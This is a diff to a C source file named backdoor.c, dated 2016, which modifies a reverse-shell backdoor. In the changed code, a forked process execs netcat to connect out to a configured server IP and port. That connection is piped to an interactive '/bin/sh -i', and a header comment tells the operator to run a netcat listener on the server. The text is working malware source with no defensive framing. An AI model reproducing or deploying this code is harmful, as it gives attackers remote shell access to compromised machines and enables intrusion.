@@ -1,6 +1,6 @@
 //
 //  backdoor.c
-//  Run nc -kl 4321 on the server.
+//  Run nc -kl $port on the server.
 //
 //  Created by Antonio Frighetto on 11/06/16.
 //  Copyright © 2016 Antonio Frighetto. All rights reserved.
@@ -110,14 +110,15 @@ createfifo:
         close(bkp);
         dup2(pipefd[1], STDOUT_FILENO);
         close(pipefd[1]);
-        execl("/usr/bin/nc", "nc", HOSTNAME, PORT, NULL);
+        execl("/usr/bin/nc", "nc", SERVER_IP, PORT, NULL);
     } else if (pid > 0) {
         close(pipefd[1]);
         dup2(bkp, STDOUT_FILENO);
+        dup2(bkp, STDERR_FILENO);
         close(bkp);
         dup2(pipefd[0], STDIN_FILENO);
         close(pipefd[0]);
-        execl("/bin/bash", "bash", NULL);
+        execl("/bin/sh", "sh", "-i", NULL);
     } else {
         exit(1);
     }
